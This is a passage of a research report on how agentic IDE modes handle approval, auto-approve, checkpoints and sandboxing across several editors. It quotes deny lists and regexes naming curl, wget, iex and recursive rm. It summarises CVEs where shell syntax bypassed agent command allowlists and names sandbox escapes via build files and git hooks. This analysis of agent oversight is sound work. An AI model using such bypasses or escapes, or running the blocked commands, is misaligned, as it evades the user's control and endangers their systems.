# Agentic IDE Modes

**Research date:** 2026-08-30
**Ticket:** [#6 Tooling Landscape](https://github.com/AndrewGodlewsky/AI-Framework/issues/6)
**Question:** In the region where the editor gains an agent loop but a human is still sitting in front
of it — what does the developer stop doing, how far do the auto-approve settings actually go, what does
a "checkpoint" really restore, and what contains the agent?

**Method.** Primary sources only: official documentation, source code read from `main`, published
settings schemas, JSON Schema specs, and vendor security advisories retrieved through the GitHub
Security Advisories API and NVD. For the open-source products (Cline, Kilo Code, Zed, VS Code, the
Agent Client Protocol) the repository was read directly — permission-decision functions, default
settings objects, checkpoint capture and restore code — in preference to any documentation page.
Where documentation and code disagree, both are reported and the disagreement is the finding. No
vendor marketing page is cited anywhere in this document.

**Currency warning.** This is the fastest-ageing material in the project. Every capability claim below
carries an "as of" date. Three of the eight products originally scoped changed category, owner or
support status inside the last six months — see §8. Treat the structural findings (§1, §3, §4, §6, §7)
as durable and the per-product settings tables (§2) as a snapshot.

---

## Headline findings

1. **Every product examined lets the human turn approval off completely, and every one of them ships a
   named mode for doing it.** VS Code calls it *Bypass Approvals* and *Autopilot*; Cursor calls it *Run
   Everything*; Cline and Kilo call it *YOLO mode* / *allow-everything*; Windsurf/Devin Desktop calls it
   *Turbo*; JetBrains Junie calls it *Brave Mode*; Zed reaches it by setting
   `agent.tool_permissions.default` to `"allow"`. There is no product in this region that structurally
   refuses to hand over the last approval.

2. **The hard floor — the set of actions that still prompt when everything is turned off — is
   vanishingly small, and in one case it is exactly five regular expressions.** Zed's entire
   un-overridable protection is five hardcoded patterns matching `rm` against `/`, `~`, `$HOME`, `.`
   and `..` ([source](https://github.com/zed-industries/zed/blob/main/crates/agent/src/tool_permissions.rs),
   read 2026-08-30). Nothing stops `git push --force`, `curl … | sh`, `dd`, `chmod -R`, or reading and
   posting a credential file. Junie's Brave Mode explicitly overrides `.aiignore`. Cline's YOLO mode has
   no floor at all for an individual user — only an enterprise remote-config key.

3. **The floor that does exist is mostly an *enterprise* floor, not a product floor.** VS Code's
   `ChatToolsAutoApprove` and `ChatToolsTerminalEnableAutoApprove` policies and Cline's
   `"yoloModeAllowed": false` remote config both work by taking the choice away from the developer. The
   vendors' answer to "where do you draw a line you won't let me cross" is, in practice, "your employer
   draws it."

4. **The command allowlist is not a security boundary, and there is a five-product CVE record proving
   it.** Zed shipped three separate allowlist bypasses on one day — environment-variable prefixing
   (CVE-2026-44463), bash arithmetic expansion (CVE-2026-44466), and `${var@P}` expansion chaining
   (CVE-2026-44462), all published 2026-05-08. Cursor shipped CVE-2026-22708 (allowlist bypass via
   environment variables, 2026-01-14). Roo Code shipped CVE-2025-57771 (process substitution and `&`
   mis-parsed, 2025-08-22) and CVE-2025-58370 (bash parameter expansion, 2025-09-04). VS Code shipped
   CVE-2026-45482 (auto-approved file write via `%APPDATA%` redirection, 2026-06-09). Every product that
   built a regex allowlist over a shell had it defeated by shell syntax. *Evidence tier: vendor security
   advisories with reproduction steps.*

5. **VS Code says so in its own source comments.** The default terminal auto-approve rule set carries
   the comment: *"these are best effort and do not aim to provide exhaustive coverage to prevent
   dangerous commands from executing as that is simply not feasible. Workspace trust and warnings of
   possible prompt injection are _the_ thing protecting the user in agent mode, once that trust boundary
   has been breached all bets are off"*
   ([source](https://github.com/microsoft/vscode/blob/main/src/vs/workbench/contrib/terminalContrib/chatAgentTools/common/terminalChatAgentToolsConfiguration.ts),
   read 2026-08-30). Cursor's own wording for the same thing: allowlists and classifier instructions are
   *"best-effort convenience. They are not a security guarantee."*

6. **Checkpoints restore fewer things than developers believe, and the gaps are documented in code.**
   Zed's restore runs `git restore --source <sha> --worktree .` and deliberately **does not** run
   `git clean` — a source comment explains the clean was removed because it would delete untracked
   binaries — so **files the agent created survive "Restore Checkpoint"**. Zed also excludes any file
   over 2 MB and a hardcoded list including `*.db`, `*.sqlite`, `.vscode/`, `.idea/` and all common image
   formats. Kilo Code's docs state plainly: *"Snapshots respect your `.gitignore` rules. Files ignored by
   Git (such as `node_modules/`, `dist/`, or `.env`) are excluded from snapshots."* Cline's SDK captures
   *"only the current untracked (but not git-ignored) files."* **No checkpoint in any product examined
   restores terminal side effects, database state, network calls, or anything outside the workspace.**

7. **Kilo Code additionally garbage-collects its own checkpoints.** *"Because snapshots are stored as raw
   tree hashes (not refs or commits), older snapshots may be pruned by garbage collection even if a
   session still references them"* — a background `git gc --prune=7.days` runs hourly. A checkpoint older
   than seven days may silently not exist. Kilo also warns that reverting a range with no stored
   checkpoint rewinds *only the conversation* while the agent's file changes stay on disk.

8. **Shipped defaults have drifted permissive, and the drift is visible in commit history.** Cline
   flipped `editFiles`, `executeAllCommands` and `useBrowser` to `true` by default on 2026-06-25
   (commit `923ee3e1`, "enable auto-approval defaults") and partially reverted the next day with
   `executeSafeCommands: false` (commit `9abd7ae8`, "disable command auto-approval by default"). As of
   `main` on 2026-08-30 the shipped default still has `editFiles: true` **and** `editFilesExternally:
   true` — file edits anywhere on the filesystem, auto-approved — while Cline's own documentation
   recommends the opposite: *"Leave edits, commands, browser, and MCP off until you have a specific
   reason."* Kilo Code's shipped baseline is `"*": "allow"` for every permission except `bash`, `.env`
   reads, out-of-project access and the doom-loop guard.

9. **Containment is real but young, narrow, and absent on Windows for the two biggest products.**
   VS Code's agent sandbox is `off` by default and available on *"macOS and Linux, including WSL2"*
   only. Cursor sandboxes with macOS Seatbelt (`sandbox-exec`) and Linux Landlock v3 (kernel ≥ 6.2,
   unprivileged user namespaces) and documents no Windows support. Zed sandboxes with `bwrap` on Linux
   and WSL on Windows, and warns that *"under some conditions, sandboxes on Windows are weaker."*
   **Cline, Kilo Code and JetBrains Junie ship no sandbox at all** — the agent runs with the developer's
   full user privileges in the developer's own shell.

10. **Zed publishes the most honest sandbox threat model in the category, and it is an admission of
    defeat at the workspace boundary.** Sandboxing covers only Zed Agent's `terminal` and `fetch` tools
    — not external agents, language servers, the git client, extensions, or ordinary terminal tabs. The
    docs then name three escapes the sandbox cannot close: a malicious Rust procedural macro executed by
    `rust-analyzer` *"outside the sandbox"*, an injected `Makefile`, and a submodule whose `core.fsmonitor`
    runs *"every time"* the shell prompt renders.

11. **Two independent protocols now let the editor host *foreign* agent harnesses, and the editor's
    permission model does not apply to them.** Zed's Agent Client Protocol (ACP, Apache-2.0, org
    `agentclientprotocol`, created 2025-06-23, v1.7.0 released 2026-08-20) and VS Code's Agent Host
    Protocol both work by having the *agent* call `session/request_permission` on the *editor*. The
    editor renders the prompt; the agent decides what to ask about. Zed states directly that sandboxing
    *"does not sandbox … External Agents."* This is the genuinely new architecture in the region, and it
    relocates the permission decision out of the tool the developer configured.

12. **The category is churning hard.** Roo Code's repository was **archived on 2026-05-15** after
    v3.54.0, with its final commits redirecting `roocode.com` to `roomote.dev` — a cloud agent whose
    README opens *"No IDE plugin. No terminal session. No babysitting."* Windsurf's documentation now
    redirects to `docs.devin.ai/desktop/…` and the product is documented as **Devin Desktop**. AWS has
    announced **end of support for Amazon Q Developer IDE plugins on 30 April 2027**, directing users to
    Kiro. Three of the region's named representatives left it, were absorbed, or were scheduled for
    retirement inside twelve months.

---

## 1. What the region is, and what the human stops doing

An agentic IDE mode is the configuration in which the editor runs an agent loop: it reads files the
developer did not name, edits several, runs commands, observes the output, and iterates — while a human
watches. It is distinguished from in-editor chat/edit by the loop, and from asynchronous cloud agents
(the next region along the spectrum) by the human's live presence.

### 1.1 The transition is from approving diffs, to approving actions, to approving sessions

The three steps are not an analytical framing imposed here. Every vendor in the region ships them as
discrete, named settings.

| Step | What the human approves | Product names for it (as of 2026-08-30) |
|---|---|---|
| **Diffs** | Each proposed edit, read before it lands | Cursor Ask/Plan mode; Devin Desktop Chat and Ask modes; Junie Ask mode; Kilo `plan`/`ask` agents; Cline Plan mode |
| **Actions** | Each tool call — this command, this file write, this MCP tool | VS Code *Default Approvals*; Cursor *Allowlist* and *Auto-review*; Junie *Action Allowlist*; Zed `tool_permissions` with `default: "confirm"`; Cline/Kilo per-tool allow/ask/deny |
| **Sessions** | The task, once, at the start | VS Code *Bypass Approvals* and *Autopilot*; Cursor *Run Everything*; Windsurf/Devin *Turbo*; Junie *Brave Mode*; Cline/Kilo *YOLO* / allow-everything; Zed `default: "allow"` |

VS Code's *Autopilot* is the clearest statement of the third step. Its confirmation dialog reads:
*"Autopilot will auto-approve all tool calls and continue working autonomously until the task is
complete. This includes terminal commands, file edits, and external tool calls. The agent will make
decisions on your behalf without asking for confirmation."*
([`chatPermissionWarnings.ts`](https://github.com/microsoft/vscode/blob/main/src/vs/workbench/contrib/chat/common/chatPermissionWarnings.ts),
read 2026-08-30.) The dialog carries a "Don't show again" checkbox, persisted at `StorageScope.PROFILE`;
accepting either elevated level suppresses the warning for the other, because *"Bypass Approvals and
Autopilot both auto-approve every tool call."*

VS Code also ships a fourth thing that is neither of the three: `chat.permissions.default` set to
**Assisted permissions**, which *"uses an LLM judge to evaluate the risk of each tool call. Calls that
the judge approves run automatically."* Cursor's *Auto-review* mode is the same idea under a different
name — a classifier decides, steered by `allow_instructions` and `block_instructions` written as
plain-English sentences in `permissions.json`. This is a fourth approver, not a fourth thing approved:
the human has delegated the approval decision itself to a model.

### 1.2 The vendors document the process change, and give the reason

Two first-party statements are worth quoting because they describe the intended change to a developer's
working method, not a feature.

Cline's checkpoints documentation (repository `docs/core-workflows/checkpoints.mdx`, read 2026-08-30):

> *"This changes how you work with Cline. Instead of carefully reviewing every change before approving,
> you can let Cline move fast and roll back if something goes wrong. The cost of a mistake drops to
> nearly zero."*

VS Code's trust-and-safety page, giving the rationale for OS-level sandboxing rather than more prompts:

> *"Approval fatigue. Repeatedly approving commands can cause you to pay less attention to what you're
> approving, especially during long agent sessions."*

This aligns with the project's established position on human oversight: the mechanism weakens precisely
as the agent is given more to do, and the vendor holding the telemetry is the one saying so. Note the
direction of the two quotes. Cline argues the *reviewing* step can be dropped because rollback is cheap
— a claim §4 shows to be substantially overstated. VS Code argues the *approving* step is unreliable and
should be replaced with containment — a claim §5 and §6 show to be correct but incompletely delivered.

---

## 2. How far auto-approve actually goes, product by product

All settings names, defaults and quotations in this section were read on **2026-08-30** unless a
different date is given.

### 2.1 GitHub Copilot agent mode in VS Code

VS Code restructured its agent documentation to `/docs/agents/*` during 2026; the custom-instructions
page carries the date **2026-08-26**. The permission model is now the most elaborate in the region.

**Session-scoped permission level — `chat.permissions.default`:**

| Level | Behaviour (vendor wording) |
|---|---|
| Default Approvals | *"Uses your configured approval settings. Tools that require approval show a confirmation dialog before they run."* |
| Assisted permissions | *"Uses an LLM judge to evaluate the risk of each tool call. Calls that the judge approves run automatically."* |
| Bypass Approvals | *"Auto-approves all tool calls without showing confirmation dialogs."* |
| Autopilot (agent mode) | Auto-approval plus continuous iteration until the task completes |

**Per-surface settings** (all `restricted: true`, i.e. disabled in untrusted workspaces):

- `chat.tools.global.autoApprove` — auto-approval across all workspaces; togglable in chat with
  `/yolo`, `/autoApprove`, `/disableYolo`.
- `chat.tools.eligibleForAutoApproval` — set `false` to force a tool always to prompt.
- `chat.tools.terminal.autoApprove` — allow/deny map of literal prefixes and `/regex/` patterns,
  evaluated **per sub-command** so `foo && bar` requires both to match.
- `chat.tools.terminal.enableAutoApprove` (default `true`) — kill switch; enterprise policy
  `ChatToolsTerminalEnableAutoApprove`.
- `chat.tools.terminal.ignoreDefaultAutoApproveRules` (default `false`, tagged experimental) —
  discards the built-in rules. Its own description: *"Use this setting at your own risk; the default
  auto-approve rules are designed to protect you against running dangerous commands."*
- `chat.tools.terminal.blockDetectedFileWrites` (default `'outsideWorkspace'`) — blocks auto-approval
  of shell redirections and `sed -i` writing outside the workspace. The description names its own
  limits: it detects only *"File redirection (detected via the bash or PowerShell tree sitter grammar)"*
  and *"`sed` in-place editing"*.
- `chat.tools.terminal.autoApproveWorkspaceNpmScripts` — **default `true`**. Any `npm`/`yarn`/`pnpm run`
  script defined in the workspace `package.json` runs with no prompt. Justification in the source:
  *"Since the workspace is trusted, scripts defined in package.json are considered safe to run without
  explicit approval."*
- `chat.tools.edits.autoApprove` — glob map for forcing manual approval on sensitive files.
- `chat.tools.urls.autoApprove` — two-step: approve the domain, then approve the fetched content. The
  post-fetch review *"is not linked to the 'Trusted Domains' feature and always requires your review."*

**The built-in default rule set** (from
`src/vs/workbench/contrib/terminalContrib/chatAgentTools/common/terminalChatAgentToolsConfiguration.ts`):

- *Allowed:* `cd echo ls dir pwd cat head tail findstr wc tr cut cmp which basename dirname realpath
  readlink stat file od du df sleep nl grep`; read-only `docker`, `npm`, `yarn`, `pnpm` sub-commands;
  `npm ci` and `--frozen-lockfile` installs only; plus `column date find rg sed sort tree xxd` **with
  specific dangerous flags individually denied** — e.g. `find` is allowed but
  `/^find\b.*\s-(delete|exec|execdir|fprint|fprintf|fls|ok|okdir)\b/` is denied, and `rg` is allowed but
  `--pre` and `--hostname-bin` are denied.
- *Denied:* `rm rmdir del Remove-Item ri rd erase dd` (deletion); `kill ps top Stop-Process spps taskkill`
  (processes); `curl wget Invoke-RestMethod Invoke-WebRequest irm iwr` (*"Web requests, prompt injection
  concerns"*); `chmod chown Set-ItemProperty sp Set-Acl` (permissions); `jq xargs eval Invoke-Expression
  iex` (*"General eval/command execution, can lead to anything else running"*).

This is the most carefully reasoned default set in the region — and its authors say in the same file
that it is not a security boundary (headline 5).

**How far it goes:** all the way. Bypass Approvals and Autopilot skip every prompt, and the warning
dialog is permanently dismissible. The only floor is the enterprise policy `ChatToolsAutoApprove`, which
*"prevents developers from enabling global auto-approval"*, plus managed per-organisation rules for
shell commands, file operations and domains, which the docs say *"may still require approval under
Bypass Approvals or Autopilot."*

**Instruction files:** `AGENTS.md` (setting `chat.useAgentsMdFile`), nested `AGENTS.md`
(`chat.useNestedAgentsMdFiles`, experimental), `CLAUDE.md` (`chat.useClaudeMdFile`),
`.github/copilot-instructions.md`, and `*.instructions.md`. Precedence: personal → repository →
organisation.

### 2.2 Cursor

Cursor restructured its permission documentation under `/docs/agent/security/`. There are three **Run
Modes**:

| Run Mode | Auto-runs | Sandbox | Classifier |
|---|---|---|---|
| Auto-review (recommended) | *"Allowlisted calls run immediately. Other shell commands run in the sandbox when possible."* | yes | yes |
| Allowlist | *"Actions in your allowlist run without approval."* | optional | no |
| Run Everything | *"Every tool call runs automatically"* | no | no |

Configuration lives in two JSON files at `~/.cursor/` (user) and `<project>/.cursor/` (project, higher
precedence): `permissions.json` (`mcpAllowlist`, `terminalAllowlist`, and `autoRun.allow_instructions` /
`autoRun.block_instructions` as natural-language hints to the classifier) and `sandbox.json` (network
domains and filesystem paths). Vendor caveat, quoted: *"Allowlists and `autoRun` instructions are
best-effort convenience. They are not a security guarantee."*

Cursor documents three named protections — **Browser Protection**, **File-Deletion Protection**
(*"Prevents the agent from automatically deleting files, including `rm` commands"*) and **External-File
Protection** (*"Prevents the agent from automatically creating, modifying or deleting files outside the
workspace"*) — described as protections that *"can require approval even when a mode would otherwise run
automatically."* **The documentation does not state whether these survive Run Everything, and Run
Everything is described as "Every tool call runs automatically."** That ambiguity is unresolved here and
is recorded as a gap in §10, not resolved in Cursor's favour.

Separately, the agent-security page states that with default settings agents *"cannot make arbitrary
network requests"* — network access is limited to GitHub, direct link retrieval and web-search providers
— and that MCP connections and their individual tool calls always require approval.

**Instruction files:** `AGENTS.md` in the project root as *"an alternative to `.cursor/rules`"*, with
nested `AGENTS.md` in subdirectories supported.

### 2.3 Windsurf Cascade — now Devin Desktop

`docs.windsurf.com/windsurf/cascade/*` issues a 307 redirect to `docs.devin.ai/desktop/cascade/*`
(observed 2026-08-30). The product is documented throughout as **Devin Desktop**; the agent is still
called Cascade, and legacy `windsurf` names survive in file paths and settings (`.windsurf/rules/`,
`windsurf-ignore`).

Modes: **Code** (*"Devin Desktop's default fully agentic mode"*), **Plan**, **Ask** (*"a read-only mode…
cannot make any changes"*). Terminal execution is governed by an allow list, a deny list, and Turbo:

- *"An allow list defines a set of terminal commands that will always auto-execute."*
- *"A deny list defines a set of terminal commands that will never auto-execute."*
- Turbo mode: *"All commands are auto-executed immediately, except those in your deny list."*
- *"the denylist takes precedence over the allowlist."*

**How far it goes:** Turbo with an empty deny list runs everything. Both lists are user-authored; no
built-in default deny set is documented. The published enterprise policy page documents only
`AllowedExtensions` and `UpdateMode` — **no policy limiting Turbo, terminal execution or agent autonomy
is documented**, in contrast to VS Code and Cline.

**Instruction files:** `AGENTS.md` and `agents.md`, case-insensitive, *"fed into the same Rules engine
that powers `.devin/rules/` (and the legacy `.windsurf/rules/`)"*, scoped automatically by file location.

### 2.4 JetBrains Junie and AI Assistant

Junie's documentation moved to `junie.jetbrains.com/docs/`; the pages read here are dated **28 August
2026**. Junie is now documented primarily as a CLI with a JetBrains IDE integration, and the recommended
in-IDE path is *"the single AI Chat in your JetBrains IDE"* — the AI Assistant plugin's chat window with
Junie selected as the coding agent — rather than the standalone Junie tool window.

Modes: **Code** (*"breaks the task into a multistep plan and executes the proposed plan… it can
autonomously run terminal commands, create new files, write or edit code, run tests"*), **Ask**
(*"read-only capacity"*), and **Auto** (Junie picks).

Junie is the only product in this set whose *documented* default is a genuine near-zero allowlist:
*"The `ls`, `cd`, and `pwd` terminal commands with any arguments are executed without user confirmation
by default. However, combining commands like `cd .. && ls` will require confirmation."*

The **Action Allowlist** has typed rule kinds: `Terminal`, `RunTest`, `Build`, `Preview`, `MCP`,
`Read outside project`, `Write outside project`, `Edit build scripts`, `Edit configuration or hidden
files`, `Read files with secrets`. Two of these are unusually well-reasoned:

- *Edit build scripts*: *"editing `build.gradle.kts` could trigger project import, which could imply
  code execution."* This is the same class of escape Zed names for `rust-analyzer` (§5.3).
- *Read files with secrets*: `.env`, `.pem`, `credentials` are sensitive by default.

Terminal rules are Java or standard regexes, and JetBrains' own documented examples teach exclusion of
shell metacharacters — `[^\s;&|<>@$]+` — with the stated reason that *"excluding `;`, `|`, and `&`,
ensures that multiple commands cannot be chained together, and excluding `<`, `>`, `@`, and `$` ensures
that dangerous operations (redirects, variable expansion, etc.) cannot be enabled."* That a vendor has
to teach users to hand-write injection-safe regexes is itself the finding in §6.

MCP rules are all-or-nothing: *"adding an item of the MCP Rule type to the Action Allowlist will
authorize Junie to run all MCP tools without user confirmation. Defining the specific MCP servers and
tools that can be run without confirmation is not possible yet."*

**Brave Mode:** *"You can authorize Junie to execute all potentially sensitive actions without user
approval by selecting Brave Mode… However, using brave mode is not recommended. Opt for adding actions
to the Action Allowlist whenever possible."*

**Containment:** `.aiignore` only, and its limits are documented explicitly — *"Only the contents of
files listed in `.aiignore` are protected. Junie will still have access to the file and folder names"* —
and it is bypassed in two named cases: *"If Brave Mode is turned on"*, and when an allowlisted command
references the ignored paths. Junie ships no sandbox.

### 2.5 Cline

Repository `cline/cline`, read from `main` on 2026-08-30; latest release tag `desktop-v0.0.20`
(2026-08-28).

`apps/vscode/src/shared/AutoApprovalSettings.ts` defines eight per-action toggles — `readFiles`,
`readFilesExternally`, `editFiles`, `editFilesExternally`, `executeSafeCommands`, `executeAllCommands`,
`useBrowser`, `useMcp` — and the shipped `DEFAULT_AUTO_APPROVAL_SETTINGS`:

```
readFiles: true,   readFilesExternally: true,
editFiles: true,   editFilesExternally: true,
executeSafeCommands: false,  executeAllCommands: true,
useBrowser: true,  useMcp: true
```

Commit history for that file:

| Date | Commit | Message |
|---|---|---|
| 2026-06-25 | `923ee3e1` | fix(vscode): enable auto-approval defaults (#11840) — flipped `editFiles`, `executeAllCommands`, `useBrowser` from `false` to `true` |
| 2026-06-26 | `9abd7ae8` | fix(vscode): disable command auto-approval by default (#11865) — flipped `executeSafeCommands` from `true` to `false` |

Per Cline's own documentation, the `*Externally` and `executeAllCommands` toggles *"only extend the base
toggle"*, so `executeSafeCommands: false` renders `executeAllCommands: true` inert — that is the
2026-06-26 fix. But `editFiles: true` **plus** `editFilesExternally: true` means, on the plain reading of
the documented semantics, that **file edits anywhere on the filesystem are auto-approved out of the
box**, along with the browser tool and all MCP tools. Cline's own recommendation contradicts its own
default: *"A good default setup: Enable **Read project files**. Leave edits, commands, browser, and MCP
off until you have a specific reason."* (Caveat: the defaults object and the documented semantics were
read; the consuming code path was not traced end-to-end, so a first-run onboarding override cannot be
excluded. See §10.)

Cline does **not** use a fixed command allowlist: *"The model marks each command with a
`requires_approval` flag based on the command and arguments. These are examples, not guarantees."* The
classifier is the model itself.

**YOLO Mode** is documented in `docs/features/auto-approve.mdx` with unusual candour: *"YOLO mode
disables all safety checks. Cline executes whatever it decides without asking permission… No confirmation
dialogs. Once enabled, Cline auto-approves all actions immediately."* The listed consequences include
*"Commit and push changes to version control."*

The only floor is enterprise: remote configuration key `"yoloModeAllowed": false`, which *"cannot be
overridden by individual users."* Cline's enterprise documentation recommends *"disable YOLO Mode by
default"* for most organisations and states it *"may conflict with change management controls"* under
SOC 2 and *"may violate HIPAA audit trail requirements."*

**Containment:** none. No sandbox is documented or present.

### 2.6 Kilo Code

Repository `Kilo-Org/kilocode`, read from `main` on 2026-08-30 (27,090 stars; last push 2026-08-31 UTC).
Kilo is now a monorepo containing a VS Code extension, a **JetBrains plugin**
(`packages/kilo-jetbrains/`), a CLI, a web console, and a vendored fork of **opencode**
(`packages/opencode/`, with Kilo overlays under `packages/opencode/src/kilocode/`). The permission model
is opencode's, patched by Kilo.

Permissions are `allow` / `ask` / `deny`, per tool, with glob-pattern rules where **the last matching
rule wins**. Tools include `external_directory`, `bash`, `read`, `edit`, `glob`, `grep`, `task`,
`agent_manager`, `skill`, `lsp`, `todoread`/`todowrite`, `websearch`, `webfetch`, `doom_loop`. MCP tools
use the namespaced key `{server}_{tool}`, e.g. `github_create_pull_request`, and accept globs.

The shipped baseline for the default `build` agent, read from
`packages/opencode/src/agent/agent.ts`:

```
"*": "allow",
doom_loop: "ask",
external_directory: { "*": "ask", …allowlisted dirs: "allow" },
read: { "*": "allow", "*.env": "ask", "*.env.*": "ask", "*.env.example": "allow" },
suggest/question/interactive_terminal/plan_enter/plan_exit/repo_clone/repo_overview: "deny"
```

…then patched by `packages/opencode/src/kilocode/agent/index.ts`, which sets `bash` to
`{"*": "ask"}` plus an approximately forty-entry allowlist: `cat head tail less ls tree pwd echo wc
which type file diff du df date uname whoami printenv man grep rg ag sort uniq cut tr jq touch mkdir cp
mv tsc tsgo tar unzip gzip gunzip`.

Two observations from reading that list against VS Code's:

- `jq` is on Kilo's **allow** list and on VS Code's **deny** list (VS Code classifies it under *"General
  eval/command execution"*).
- `cp`, `mv`, `mkdir`, `touch`, `tar`, `unzip` are file-mutating and auto-approved; `printenv` exposes
  the full environment even though `.env` file reads are gated.

**Doc/code discrepancy.** Kilo's own documentation says *"Most tools default to `"*": "allow"`… Notable
exceptions that prompt by default: `.env` files, `external_directory`, `doom_loop`."* It omits `bash`
from that list. The code is *more* restrictive than the docs claim — the discrepancy runs in the safe
direction, but the published default is wrong.

**How far it goes:** `packages/opencode/src/kilocode/permission/allow-everything.ts` installs the single
rule `{ permission: "*", pattern: "*", action: "allow" }` either per-session or globally. Its documented
floor: *"Kilo treats `.env` and `.env.*` reads as sensitive. Broad read approvals, such as `read: allow`,
`read: { "*": allow }`, saved wildcard approvals, or allow-everything mode do not bypass the built-in
prompt for these files."* That single `.env` prompt is Kilo's entire hard floor for the default agent.

Kilo does have a genuine sealed floor, but only for its read-only agents: `index.ts` re-applies
`bash: "deny"` *after* user configuration with the comment *"Enforce bash deny after user so user config
cannot re-enable shell"*, and maintains a `sealed` list of permissions *"no config rule may re-tune."*

**Configuration hazard, documented:** project-level `kilo.jsonc` is cached at workspace load and not
re-read per prompt, so *"an auto-approved call may still cite a project rule you just edited"* until the
window is reloaded.

**Containment:** none. No sandbox.

### 2.7 Zed

Repository `zed-industries/zed`, read from `main` on 2026-08-30.

Setting: `agent.tool_permissions`, replacing the boolean `agent.always_allow_tool_actions` (default
`false`) in **v0.224.0**. Values are `"allow"`, `"deny"`, `"confirm"` (global default). Permission-gated
tools: `terminal`, `edit_file`, `write_file`, `delete_path`, `move_path`, `copy_path`,
`create_directory`, `fetch`, `search_web`, `skill`, and MCP tools as `mcp:<server>:<tool>`.

Precedence, taken from the doc comment on `ToolPermissionDecision::from_input` and confirmed against the
implementation:

1. **Hardcoded security rules** — *"cannot be bypassed by any user settings"*
2. `always_deny`
3. `always_confirm` — *"always prompt, even when `tool_permissions.default` is `"allow"`"*
4. `always_allow`
5. tool-specific `default`
6. global `default`

**The hardcoded floor, in full.** `HARDCODED_SECURITY_RULES` contains a single field, `terminal_deny`,
holding five compiled regexes: recursive `rm` against `/`, `~`, `$HOME`/`${HOME}`, `.`, and `..`. The
denial message: *"Blocked by built-in security rule. This operation is considered too harmful to be
allowed, and cannot be overridden by settings."* The matcher additionally normalises paths and expands
multi-path `rm` invocations to catch `rm -rf /tmp /` and `rm -rf /tmp/../../`. **That is the entirety of
what Zed will not let a user turn off.**

Zed's post-CVE hardening is worth naming precisely. Permission-protected terminal commands are rejected
if they contain shell substitution: *"terminal does not allow shell substitutions or interpolations in
permission-protected commands. Forbidden examples include `$VAR`, `${VAR}`, `$(...)`, backticks,
`$((...))`, `<(...)`, and `>(...)`."* Commands are parsed with `brush-parser` into sub-commands, and if
parsing fails, `always_allow` is disabled for that command; on a shell whose chaining syntax cannot be
parsed, configured `always_allow` patterns cause an outright **deny** rather than a silent fallback.

**But the substitution check is skipped when the user opts into allow-everything.** The guard runs only
when `is_unconditional_allow_all()` is false — i.e. when there are `always_deny`/`always_confirm` rules
or the effective default is not `Allow`. Turning on blanket allow therefore also switches off the
injection-parsing defence that was added to fix CVE-2026-44462/44463/44466.

### 2.8 Amazon Q Developer

Recorded for completeness and because its status is the finding. The AWS user guide carries an end-of-
support notice: *"On April 30, 2027, AWS will discontinue support for Amazon Q Developer IDE plugins.
For capabilities similar to Amazon Q Developer IDE plugins, explore Kiro to access the latest models and
features, including agentic coding, chat and MCP support."* The migration page states that *"everything
you rely on today (inline suggestions, chat, and code generation) is available in Kiro."* No agentic
approval model for the Q IDE plugins is documented on the pages read; the agentic capability is
attributed to Kiro, a separate product outside the sources gathered for this strand.

---

## 3. The floors: what still prompts when the human turns approval off

| Product | Name of "off" | What still prompts, that the user cannot disable |
|---|---|---|
| VS Code / Copilot | Bypass Approvals, Autopilot, `chat.tools.global.autoApprove` | Nothing, for an individual. Enterprise: `ChatToolsAutoApprove`, `ChatToolsTerminalEnableAutoApprove`, managed per-org rules for shell/file/domain |
| Cursor | Run Everything | Documented protections (Browser, File-Deletion, External-File) *"can require approval even when a mode would otherwise run automatically"* — **applicability to Run Everything not documented**. MCP tool calls documented as always requiring approval |
| Windsurf / Devin Desktop | Turbo | Only the user's own deny list. No documented built-in floor, no enterprise policy |
| JetBrains Junie | Brave Mode | Nothing. Brave Mode is documented as overriding `.aiignore` |
| Cline | YOLO Mode | Nothing, for an individual. Enterprise: `"yoloModeAllowed": false` |
| Kilo Code | allow-everything | `.env` / `.env.*` reads. Plus `bash: "deny"` sealed on read-only agents only |
| Zed | `tool_permissions.default: "allow"` | Five hardcoded `rm` regexes. Turning on blanket allow additionally disables the shell-substitution check |

The pattern is consistent: **the floor is either an enterprise policy or a single hardcoded pattern
class aimed at catastrophic self-deletion.** Nothing in the region reserves a category like "network
egress with credentials present", "history rewriting", or "publishing" as always-human. None of the
vendors publishes a reasoned account of *why* their floor is where it is; the closest is VS Code's
source comment, which argues that no floor is feasible once workspace trust is granted, and Zed's
sandboxing page, which argues the same about side channels.

---

## 4. Rollback and blast radius: what a checkpoint actually restores

Every product in the region offers checkpoints and every product markets them as the reason auto-approval
is safe. Read as implementations, they are narrower than that.

### 4.1 Zed — restore does not delete what the agent created

Capture (`crates/git/src/repository.rs`, `untracked_files_for_checkpoint`): the checkpoint commit
includes tracked files plus untracked files that survive three filters —
`git ls-files --others --exclude-standard` (so **`.gitignore` is honoured; ignored files are excluded**),
an additional `--exclude-from` list held in `crates/git/src/checkpoint.gitignore`, and a **2 MB size
cap** (*"skipping commonly ignored file types and files over 2MB"*).

`checkpoint.gitignore` excludes, among others: all executables and object files, all archives, all
common image and video formats, **`*.db`, `*.sqlite`, `*.sqlite3`, `*.mdb`**, PDFs and Office documents,
and **`.idea/` and `.vscode/`**.

Restore (`restore_checkpoint`) runs exactly:

```
git restore --source <checkpoint sha> --worktree .
```

followed by a commented-out `read-tree` + `git clean -d --force`, with this comment left in the source:

> *"TODO: We don't track binary and large files anymore, so the following call would delete them.
> Implement an alternative way to track files added by agent."*

**Consequence: a file the agent created after the checkpoint is not in the checkpoint tree, and with the
clean disabled, `git restore` will not remove it.** "Restore Checkpoint" in Zed reverts modifications to
known files; it does not undo creations. A developer who believes the button returns the workspace to
its prior state is wrong in a way the source acknowledges.

### 4.2 Kilo Code — snapshots expire, and `.gitignore` is honoured

Architecture (documented and consistent with the code layout): a dedicated snapshot Git repository at
`~/.local/share/kilo/snapshot/<project-id>/<worktree-hash>/`, with `git write-tree` run against the
workspace before and after each agent step; the project's own `.git` is untouched.

Documented limits, quoted:

- *"Snapshots respect your `.gitignore` rules. Files ignored by Git (such as `node_modules/`, `dist/`,
  or `.env`) are excluded from snapshots."*
- *"Revert granularity is **per user message**, not per individual step or file edit."*
- *"Because snapshots are stored as raw tree hashes (not refs or commits), older snapshots may be pruned
  by garbage collection even if a session still references them."* A background `git gc --prune=7.days`
  runs hourly.
- *"If snapshots are disabled or the reverted range has no stored checkpoint, only the conversation is
  rewound — the agent's file changes remain on disk."*
- *"Checkpoints only capture changes made during active Kilo Code tasks."* Modifications made outside a
  task are not included. Restoration *"will overwrite any unsaved changes."*
- Checkpoints require Git and a Git repository; otherwise *"Kilo skips checkpoints automatically."*

### 4.3 Cline — a shadow repository, and a `git clean -fd` on the real one

